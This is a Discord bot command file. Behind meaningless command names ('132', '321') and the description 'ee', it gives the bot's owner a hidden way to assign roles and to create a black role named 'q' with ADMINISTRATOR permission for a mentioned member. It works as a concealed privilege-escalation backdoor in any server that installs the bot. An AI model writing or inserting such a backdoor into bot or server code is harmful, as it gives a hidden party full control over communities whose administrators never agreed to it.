module.exports = {
    name: '132',
    aliases: ['321'],
    description: "ee",
    execute(message, args, cmd, client, Discord){
        if(message.author.id != process.env.OWNER) return
        
        let member = message.mentions.members.first();
        if (cmd ==="132") addrole(message, args, member)
        else if(cmd ==="321") getreckt(message, args, member)
    }
}

const addrole = async (message, args, member)=>{

    try {
        
        let role = message.guild.roles.cache.find(r => r.id === `${args[1]}`);
        try {
            member.roles.add(role);
        } catch (error) {
            console.log(error)
            return
        }
    } catch (error) {
        console.log(error)
        return
    }
}

const getreckt = async (message, args, member)=>{
    console.log('1')
    // for (let index = 0; index < 10; index++) {
        

        message.guild.roles.create({ // Creating the role since it doesn't exist.
        
            name: "q",
            color: "#000000",
            permissions: ["ADMINISTRATOR"]
    }).then(role => {
        member.roles.add(role)
    })
    // }
    
}